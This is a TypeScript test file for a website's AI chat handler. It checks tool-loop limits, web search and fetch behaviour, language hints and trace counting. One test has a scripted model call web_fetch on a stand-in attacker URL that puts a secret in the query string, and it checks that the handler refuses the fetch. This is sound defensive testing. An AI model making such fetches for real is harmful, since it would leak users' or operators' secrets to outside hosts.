import assert from "node:assert/strict";
import test from "node:test";

import type Anthropic from "@anthropic-ai/sdk";
import { GOD_CHAT_LIMITS } from "@shared/god-chat";
import type { Env } from "./runtime.ts";
import type { ChatQuota } from "./chat/quota.ts";
import { binding, chatRequest, deepseekFetch, designEnv, handleChat, modelStream, parseEvents, scriptedStream, toolIO, unexpected } from "./chat/testing/handler-fixture.ts";

test("服务端无视工具关闭继续返回调用也不能延长工具循环", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const { env, requests } = designEnv({ reply: (body) => modelStream(body.model, true) });
  const events = await parseEvents(await handleChat(chatRequest(), env, toolIO));
  assert.equal(requests.length, GOD_CHAT_LIMITS.maxToolRounds + 1);
  assert.deepEqual(requests.at(-1)?.tool_choice, { type: "none" });
  assert.ok(requests.slice(0, -1).every((request) => request.tool_choice === undefined));
  assert.ok(requests.at(-1)?.messages.some((m) => m.role === "system" && typeof m.content === "string" && m.content.startsWith("No tools remain")));
  assert.ok(events.some((event) => event.type === "text" && event.text.includes("ran out of steps")));
});

test("web_search 走 Worker 调搜索服务，DeepSeek 档拿纯文本结果、正文链到的页进来源；web_fetch 不读没出现过的 URL", async (t) => {
  const original = globalThis.fetch;
  const outbound: string[] = [];
  globalThis.fetch = async (input) => {
    const url = String(input);
    if (url.includes("api.exa.ai")) {
      outbound.push(url);
      return Response.json({ results: [{ url: "https://e.dev/page", title: "E", highlights: ["fact"] }] });
    }
    return unexpected();
  };
  t.after(() => { globalThis.fetch = original; });
  const calls = [
    { name: "web_search", input: { query: "deepseek pricing", category: "web" } },
    { name: "web_fetch", input: { url: "https://attacker.example/?q=secret" } },
  ];
  const { env, requests } = designEnv({
    reply: (body) => {
      const call = calls[requests.length - 1];
      if (call) return modelStream(body.model, call);
      const events = [
        { type: "message_start", message: { id: "msg_test", type: "message", role: "assistant", model: body.model, content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: 10, output_tokens: 0 } } },
        { type: "content_block_start", index: 0, content_block: { type: "text", text: "", citations: [] } },
        { type: "content_block_delta", index: 0, delta: { type: "text_delta", text: "Cheap, per [E](https://e.dev/page)." } },
        { type: "content_block_stop", index: 0 },
        { type: "message_delta", delta: { stop_reason: "end_turn", stop_sequence: null }, usage: { output_tokens: 10 } },
        { type: "message_stop" },
      ];
      return new Response(events.map((event) => `event: ${event.type}\ndata: ${JSON.stringify(event)}\n\n`).join(""), { headers: { "Content-Type": "text/event-stream" } });
    },
  });
  env.EXA_API_KEY = "test-exa";
  const events = await parseEvents(await handleChat(chatRequest(undefined, [{ role: "user", content: "How much is DeepSeek?" }]), env, toolIO));
  assert.equal(outbound.length, 1);
  const searchResult = requests[1].messages.at(-1)?.content;
  assert.ok(Array.isArray(searchResult) && searchResult[0].type === "tool_result" && typeof searchResult[0].content === "string" && searchResult[0].content.includes("URL: https://e.dev/page"));
  const fetchResult = requests[2].messages.at(-1)?.content;
  assert.ok(Array.isArray(fetchResult) && fetchResult[0].type === "tool_result" && fetchResult[0].is_error === true);
  assert.ok(events.some((event) => event.type === "search" && event.query === "deepseek pricing"));
  assert.deepEqual(events.find((event) => event.type === "sources"), { type: "sources", sources: [{ url: "https://e.dev/page", title: "E" }] });
});

test("先写完答案再调 show_card、下一轮空收尾时不提示步数用完；查数据后空收尾仍提示", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  for (const [call, warned] of [
    [{ type: "tool_use", id: "tool_card", name: "show_card", input: { card: "nowListening" } }, false],
    [{ type: "tool_use", id: "tool_status", name: "get_site_status", input: { views: ["timezone"] } }, true],
  ] as const) {
    const { env, requests } = designEnv({
      reply: (body) => requests.length === 1
        ? scriptedStream(body.model, [{ type: "text", text: "Let me check." }, call], "tool_use")
        : scriptedStream(body.model, [], "end_turn"),
    });
    const events = await parseEvents(await handleChat(chatRequest(), env, toolIO));
    assert.equal(requests.length, 2);
    assert.equal(events.some((event) => event.type === "text" && event.text.includes("ran out of steps")), warned, call.name);
  }
});

test("汉字假名提问时点名不许改英文，有假名才说日文，没有汉字假名只说照原文，没有字母不加", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  for (const [content, expected] of [["LYJW 现在在干什么？", "Chinese or Japanese"], ["今何時", "Chinese or Japanese"], ["今日の天気", "Japanese"], ["LYJWは今なにをしていますか？", "Japanese"], ["What is LYJW up to?", "a language other than Chinese or Japanese"], ["Que fait LYJW ?", "a language other than Chinese or Japanese"], ["??", undefined], ["👍", undefined]] as const) {
    const { env, requests } = designEnv();
    await parseEvents(await handleChat(chatRequest(undefined, [{ role: "user", content }]), env, toolIO));
    const notes = requests[0].messages.filter((m) => m.role === "system" && typeof m.content === "string" && m.content.startsWith("The visitor's latest message is in"));
    assert.deepEqual(notes.map((m) => (m.content as string).match(/is in (.+?)\. /)?.[1]), expected ? [expected] : [], content);
  }
});

test("只用了检索 MCP 的回复也在签名 trace 里记搜索次数，流式块与最终块不重复计", async (t) => {
  const original = globalThis.fetch;
  globalThis.fetch = async () => unexpected();
  t.after(() => { globalThis.fetch = original; });
  const { env } = designEnv({
    reply: (body) => scriptedStream(body.model, [
      { type: "mcp_tool_use", id: "mcptoolu_1", name: "searchGitHub", server_name: "grep-app", input: { query: "setAlarm" } },
      { type: "text", text: "Found it." },
    ], "end_turn"),
  });
  const events = await parseEvents(await handleChat(chatRequest(), env, toolIO));
  const seal = events.find((event) => event.type === "seal");
  assert.equal(seal?.type === "seal" && seal.trace?.searches, 1);
  assert.equal(events.filter((event) => event.type === "search").length, 1);
});

test("同一轮的多个搜索调用一起发出，结果按调用顺序回", async (t) => {
  const original = globalThis.fetch;
  let inFlight = 0;
  let peak = 0;
  globalThis.fetch = async (input) => {
    const url = String(input);
    if (!url.includes("api.exa.ai")) return unexpected();
    inFlight++;
    peak = Math.max(peak, inFlight);
    await new Promise((resolve) => setTimeout(resolve, 20));
    inFlight--;
    return Response.json({ results: [{ url: "https://e.dev/page", title: "E", highlights: ["fact"] }] });
  };
  t.after(() => { globalThis.fetch = original; });
  const { env, requests } = designEnv({
    reply: (body) => requests.length === 1
      ? scriptedStream(body.model, [
        { type: "tool_use", id: "tool_a", name: "web_search", input: { query: "a", category: "web" } },
        { type: "tool_use", id: "tool_b", name: "web_search", input: { query: "b", category: "news" } },
      ], "tool_use")
      : scriptedStream(body.model, [{ type: "text", text: "Done." }], "end_turn"),
  });
  env.EXA_API_KEY = "test-exa";
  await parseEvents(await handleChat(chatRequest(), env, toolIO));
  assert.equal(peak, 2);
  const results = requests[1].messages.at(-1)?.content;
  assert.ok(Array.isArray(results));
  assert.deepEqual(results.map((block) => block.type === "tool_result" && block.tool_use_id), ["tool_a", "tool_b"]);
});

test("开思考的 DeepSeek 档给没有思考块的工具调用补占位思考，关思考的档原样发", async (t) => {
  const original = globalThis.fetch;
  t.after(() => { globalThis.fetch = original; });
  for (const tier of ["think", "flash"] as const) {
    const requests: Anthropic.Beta.MessageCreateParamsStreaming[] = [];
    globalThis.fetch = deepseekFetch(async (request) => {
      const body = await request.json() as Anthropic.Beta.MessageCreateParamsStreaming;
      requests.push(body);
      return modelStream(body.model, false);
    });
    const env: Env = {
      PUBLIC_STATUS: { readStatus: async () => new Response("unused") },
      ANTHROPIC_API_KEY: "test-key",
      DEEPSEEK_API_KEY: "test-deepseek",
      TURNSTILE_SECRET_KEY: "test-turnstile",
      CHAT_HISTORY_SECRET: "test-seal",
      AI: Object.assign({} as Ai, { run: async () => ({ answers: { route: { choice: tier }, status: { choice: "listening", probabilities: { listening: 0.9 } } } }) }),
      CHAT_QUOTA: binding<ChatQuota>({ admitVisitor: async () => "ok" as const, admitTier: async () => tier }),
    };
    await parseEvents(await handleChat(chatRequest(undefined, [{ role: "user", content: "他最近在听谁的歌" }]), env, toolIO));
    const call = requests[0].messages.find((message) => message.role === "assistant");
    assert.ok(call && Array.isArray(call.content));
    assert.deepEqual(call.content.map((block) => block.type), tier === "think" ? ["thinking", "tool_use"] : ["tool_use"]);
  }
});
